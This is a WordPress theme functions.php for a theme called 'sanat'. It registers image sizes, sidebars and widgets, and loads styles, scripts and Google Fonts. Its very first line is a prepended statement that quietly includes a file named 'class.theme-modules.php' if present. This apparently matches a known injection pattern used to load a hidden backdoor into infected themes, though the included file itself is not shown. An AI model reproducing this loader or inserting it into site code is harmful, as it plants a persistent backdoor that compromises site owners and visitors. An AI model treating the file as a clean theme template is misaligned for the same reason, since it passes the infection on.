<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
add_action('after_setup_theme', 'sanat_bunch_theme_setup');
function sanat_bunch_theme_setup()
{
	global $wp_version;
	if(!defined('SANAT_VERSION')) define('SANAT_VERSION', '1.0');
	if( !defined( 'SANAT_ROOT' ) ) define('SANAT_ROOT', get_template_directory().'/');
	if( !defined( 'SANAT_URL' ) ) define('SANAT_URL', get_template_directory_uri().'/');	
	include_once get_template_directory() . '/includes/loader.php';
	
	
	load_theme_textdomain('sanat', get_template_directory() . '/languages');
	
	//ADD THUMBNAIL SUPPORT
	add_theme_support('post-thumbnails');
	add_theme_support( 'post-formats', array( 'gallery' ) );
	add_theme_support('woocommerce');
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support('automatic-feed-links'); //Enables post and comment RSS feed links to head.
	add_theme_support('widgets'); //Add widgets and sidebar support
	add_theme_support( "title-tag" );
	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	) );
	/** Register wp_nav_menus */
	if(function_exists('register_nav_menu'))
	{
		register_nav_menus(
			array(
				/** Register Main Menu location header */
				'main_menu' => esc_html__('Main Menu', 'sanat'),
			)
		);
	}
	if ( ! isset( $content_width ) ) $content_width = 960;
	add_image_size( 'sanat_370x240', 370, 240, true ); // 'sanat_370x240 Our Services'
	add_image_size( 'sanat_762x300', 762, 300, true ); // 'sanat_762x300 Our Projects'
	add_image_size( 'sanat_376x610', 376, 610, true ); // 'sanat_376x610 Our Projects'
	add_image_size( 'sanat_376x300', 376, 300, true ); // 'sanat_376x300 Our Projects'
	add_image_size( 'sanat_50x50', 50, 50, true ); // 'sanat_50x50 Our Testimonials'
	add_image_size( 'sanat_265x400', 265, 400, true ); // 'sanat_265x400 Our Team'
	add_image_size( 'sanat_570x270', 570, 270, true ); // 'sanat_570x270 Latest News'
	add_image_size( 'sanat_231x235', 231, 235, true ); // 'sanat_231x235 Latest News'
	add_image_size( 'sanat_370x250', 370, 250, true ); // 'sanat_370x250 Our Services 2'
	add_image_size( 'sanat_350x270', 350, 270, true ); // 'sanat_350x270 Our Projects 2'
	add_image_size( 'sanat_370x240', 370, 240, true ); // 'sanat_370x240 Latest News 2'
	add_image_size( 'sanat_1170x460', 1170, 460, true ); // 'sanat_1170x460 Project Single'
	add_image_size( 'sanat_1170x400', 1170, 400, true ); // 'sanat_1170x400 Our Blog'
	add_image_size( 'sanat_65x65', 65, 65, true ); // 'sanat_65x65 Latest Posts Widget'
	add_image_size( 'sanat_100x80', 100, 80, true ); // 'sanat_100x80 Popular Posts Widget'
	add_image_size( 'sanat_90x90', 90, 90, true ); // 'sanat_65x65 Latest Posts Widget'
}
function sanat_bunch_widget_init()
{
	global $wp_registered_sidebars;
	$theme_options = _WSH()->option();
	//Footer Widget
	if( class_exists( 'Bunch_About_us' ) )register_widget( 'Bunch_About_us' );
	if( class_exists( 'Bunch_services' ) )register_widget( 'Bunch_services' );
	if( class_exists( 'Bunch_Latest_Posts' ) )register_widget( 'Bunch_Latest_Posts' );
	if( class_exists( 'Bunch_Subscribe_Us' ) )register_widget( 'Bunch_Subscribe_Us' );
	//Services Widget
	if( class_exists( 'Bunch_services_sidebar' ) )register_widget( 'Bunch_services_sidebar' );
	if( class_exists( 'Bunch_Brochures' ) )register_widget( 'Bunch_Brochures' );
	//Blog Widget
	if( class_exists( 'Bunch_popular_Post' ) )register_widget( 'Bunch_popular_Post' );
	
	
	
	
	register_sidebar(array(
	  'name' => esc_html__( 'Default Sidebar', 'sanat' ),
	  'id' => 'default-sidebar',
	  'description' => esc_html__( 'Widgets in this area will be shown on the right-hand side.', 'sanat' ),
	  'before_widget'=>'<div id="%1$s" class="widget sidebar-widget %2$s">',
	  'after_widget'=>'</div>',
	  'before_title' => '<div class="sidebar-title"><h3>',
	  'after_title' => '</h3><div class="separater"></div></div>'
	));
	register_sidebar(array(
	  'name' => esc_html__( 'Footer Sidebar', 'sanat' ),
	  'id' => 'footer-sidebar',
	  'description' => esc_html__( 'Widgets in this area will be shown in Footer Area.', 'sanat' ),
	  'before_widget'=>'<div class="footer-column col-md-3 col-sm-6 col-xs-12"><div id="%1$s"  class="footer-widget %2$s">',
	  'after_widget'=>'</div></div>',
	  'before_title' => '<div class="footer-title"><h2>',
	  'after_title' => '</h2></div>'
	));
	
	register_sidebar(array(
	  'name' => esc_html__( 'Blog Listing', 'sanat' ),
	  'id' => 'blog-sidebar',
	  'description' => esc_html__( 'Widgets in this area will be shown on the right-hand side.', 'sanat' ),
	  'before_widget'=>'<div id="%1$s" class="widget sidebar-widget %2$s">',
	  'after_widget'=>'</div>',
	  'before_title' => '<div class="sidebar-title"><h3>',
	  'after_title' => '</h3><div class="separater"></div></div>'
	));
	
	register_sidebar(array(
	  'name' => esc_html__( 'Shop Sidebar', 'sanat' ),
	  'id' => 'shop-sidebar',
	  'description' => esc_html__( 'Widgets in this area will be shown on the right-hand side.', 'sanat' ),
	  'before_widget'=>'<div id="%1$s" class="widget shop-sidebar sidebar-widget %2$s">',
	  'after_widget'=>'</div>',
	  'before_title' => '<div class="sidebar-title"><h2>',
	  'after_title' => '</h2><div class="separater"></div></div>'
	));
	if( !is_object( _WSH() )  )  return;
	$sidebars = sanat_set(sanat_set( $theme_options, 'dynamic_sidebar' ) , 'dynamic_sidebar' ); 
	foreach( array_filter((array)$sidebars) as $sidebar)
	{
		if(sanat_set($sidebar , 'topcopy')) continue ;
		
		$name = sanat_set( $sidebar, 'sidebar_name' );
		
		if( ! $name ) continue;
		$slug = sanat_bunch_slug( $name ) ;
		
		register_sidebar( array(
			'name' => $name,
			'id' =>  sanitize_title( $slug ) ,
			'before_widget' => '<div id="%1$s" class="widget sidebar-widget %2$s">',
			'after_widget' => "</div>",
			'before_title' => '<div class="sidebar-title"><h2>',
			'after_title' => '</h2><div class="separater"></div></div>',
		) );		
	}
	
	update_option('wp_registered_sidebars' , $wp_registered_sidebars) ;
}
add_action( 'widgets_init', 'sanat_bunch_widget_init' );
// Update items in cart via AJAX
function sanat_load_head_scripts() {
	$options = _WSH()->option();
    if ( !is_admin() ) {
		$protocol = is_ssl() ? 'https://' : 'http://';
		$map_path = '?key='.sanat_set($options, 'map_api_key');
		wp_enqueue_script( 'sanat-map-api', ''.$protocol.'maps.google.com/maps/api/js'.$map_path, array(), false, false );
	}
}
add_action( 'wp_enqueue_scripts', 'sanat_load_head_scripts' );
//global variables
function sanat_bunch_global_variable() {
    global $wp_query;
}

function sanat_enqueue_scripts() {
	$theme_options = _WSH()->option();
	$rtl = sanat_set($theme_options,'rtl');
	if(sanat_set( $theme_options, 'color_scheme_style') == 'custom_color'){
	$maincolor = str_replace( '#', '' , sanat_set( $theme_options, 'main_color_scheme', '#ffb200' ) );
	}
	elseif(sanat_set( $theme_options, 'color_scheme_style') == 'predefined_color'){
	$maincolor = str_replace( '#', '' , sanat_set( $theme_options, 'predefined_color_scheme', '#ffb200' ) );	
	}
	else{
	$maincolor = str_replace( '#', '' , '#ffb200' );	
	}
	//styles
	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/css/bootstrap.css' );
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.css' );
	wp_enqueue_style( 'flaticon', get_template_directory_uri() . '/css/flaticon.css' );
	wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css' );
	wp_enqueue_style( 'owl-theme', get_template_directory_uri() . '/css/owl.css' );
	wp_enqueue_style( 'fancybox', get_template_directory_uri() . '/css/jquery.fancybox.min.css' );
	wp_enqueue_style( 'hover', get_template_directory_uri() . '/css/hover.css' );
	wp_enqueue_style( 'gui', get_template_directory_uri() . '/css/gui.css' );
	wp_enqueue_style( 'bootstrap-touchspin', get_template_directory_uri() . '/css/jquery.bootstrap-touchspin.css' );
	wp_enqueue_style( 'sanat-main-style', get_stylesheet_uri() );
	wp_enqueue_style( 'sanat-custom-style', get_template_directory_uri() . '/css/custom.css' );
	wp_enqueue_style( 'sanat-responsive', get_template_directory_uri() . '/css/responsive.css' );
	wp_enqueue_style( 'sanat-default', get_template_directory_uri() . '/css/color-themes/default-theme.css' );
	if(class_exists('woocommerce')) wp_enqueue_style( 'sanat_woocommerce', get_template_directory_uri() . '/css/woocommerce.css' );
	wp_enqueue_style( 'sanat-main-color', get_template_directory_uri() . '/css/color.php?main_color='.$maincolor );
	
    //scripts
	wp_enqueue_script( 'jquery-ui-core' );
	wp_enqueue_script( 'bootstrap', get_template_directory_uri().'/js/bootstrap.min.js', array(), false, true );
	wp_enqueue_script( 'mCustomScrollbar', get_template_directory_uri().'/js/jquery.mCustomScrollbar.concat.min.js', array(), false, true );
	wp_enqueue_script( 'fancybox-pack', get_template_directory_uri().'/js/jquery.fancybox.js', array(), false, true );
	wp_enqueue_script( 'owl', get_template_directory_uri().'/js/owl.js', array(), false, true );
	wp_enqueue_script( 'wow', get_template_directory_uri().'/js/wow.js', array(), false, true );
	wp_enqueue_script( 'appear', get_template_directory_uri().'/js/appear.js', array(), false, true );
	wp_enqueue_script( 'isotope', get_template_directory_uri().'/js/isotope.js', array(), false, true );
	wp_enqueue_script( 'mixitup', get_template_directory_uri().'/js/mixitup.js', array(), false, true );
	wp_enqueue_script( 'sanat-custom-menu', get_template_directory_uri().'/js/custom-menu.js', array(), false, true );
	wp_enqueue_script( 'jquery-countdown', get_template_directory_uri().'/js/jquery.countdown.js', array(), false, true );
	wp_enqueue_script( 'sanat-main-script', get_template_directory_uri().'/js/script.js', array(), false, true );
	if( is_singular() ) wp_enqueue_script('comment-reply');
}
add_action( 'wp_enqueue_scripts', 'sanat_enqueue_scripts' );

/*-------------------------------------------------------------*/
function sanat_theme_slug_fonts_url() {
    $fonts_url = '';
 
    /* Translators: If there are characters in your language that are not
    * supported by Lora, translate this to 'off'. Do not translate
    * into your own language.
    */
    $arimo = _x( 'on', 'Arimo font: on or off', 'sanat' );
	$raleway = _x( 'on', 'Raleway font: on or off', 'sanat' );
	$montserrat = _x( 'on', 'Montserrat font: on or off', 'sanat' );
	
	
    if ( 'off' !== $arimo || 'off' !== $montserrat || 'off' !== $raleway ) {
        $font_families = array();
 
        if ( 'off' !== $arimo ) {
            $font_families[] = 'Arimo:400,400i,700,700i';
        }
		
		if ( 'off' !== $montserrat ) {
            $font_families[] = 'Montserrat:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i';
        }
		
		if ( 'off' !== $raleway ) {
            $font_families[] = 'Raleway:100,100i,200,200i,300,300i,400,400i,500,500i,600,600i,700,700i,800,800i,900,900i';
        }
 
        $opt = get_option('sanat'.'_theme_options');
		if ( sanat_set( $opt, 'body_custom_font' ) ) {
			if ( $custom_font = sanat_set( $opt, 'body_font_family' ) )
				$font_families[] = $custom_font . ':300,300i,400,400i,600,700';
		}
		if ( sanat_set( $opt, 'use_custom_font' ) ) {
			$font_families[] = sanat_set( $opt, 'h1_font_family' ) . ':300,300i,400,400i,600,700';
			$font_families[] = sanat_set( $opt, 'h2_font_family' ) . ':300,300i,400,400i,600,700';
			$font_families[] = sanat_set( $opt, 'h3_font_family' ) . ':300,300i,400,400i,600,700';
			$font_families[] = sanat_set( $opt, 'h4_font_family' ) . ':300,300i,400,400i,600,700';
			$font_families[] = sanat_set( $opt, 'h5_font_family' ) . ':300,300i,400,400i,600,700';
			$font_families[] = sanat_set( $opt, 'h6_font_family' ) . ':300,300i,400,400i,600,700';
		}
		$font_families = array_unique( $font_families);
        
		$query_args = array(
            'family' => urlencode( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 
        $fonts_url = add_query_arg( $query_args, 'https://fonts.googleapis.com/css' );
    }
 
    return esc_url_raw( $fonts_url );
}

function sanat_load_admin_things() {
    wp_enqueue_script('media-upload');
    wp_enqueue_script('thickbox');
    wp_enqueue_style('thickbox');
}

add_action( 'admin_enqueue_scripts', 'sanat_load_admin_things' );

function sanat_theme_slug_scripts_styles() {
    wp_enqueue_style( 'sanat-theme-slug-fonts', sanat_theme_slug_fonts_url(), array(), null );
}
add_action( 'wp_enqueue_scripts', 'sanat_theme_slug_scripts_styles' );
/*---------------------------------------------------------------------*/
function sanat_add_editor_styles() {
    add_editor_style( 'custom-editor-style.css' );
}
add_action( 'admin_init', 'sanat_add_editor_styles' );